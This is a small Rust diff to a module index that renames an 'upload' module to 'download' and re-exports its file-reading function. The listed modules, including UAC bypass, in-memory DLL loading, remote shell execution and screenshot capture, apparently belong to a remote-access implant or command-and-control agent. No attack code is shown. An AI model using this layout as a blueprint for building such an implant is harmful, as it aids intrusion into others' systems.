@@ -8,7 +8,7 @@ mod models;
 mod screenshot;
 mod shell;
 mod uacbypass;
-mod upload;
+mod download;
 
 pub use kill::execute_kill;
 pub use loaddll::load_dll_from_bytes;
@@ -16,4 +16,4 @@ pub use models::{get_help_message, Command, CommandResult};
 pub use screenshot::capture_screenshot;
 pub use shell::execute_shell_command;
 pub use uacbypass::execute_uac_bypass;
-pub use upload::read_file_bytes;
+pub use download::read_file_bytes;
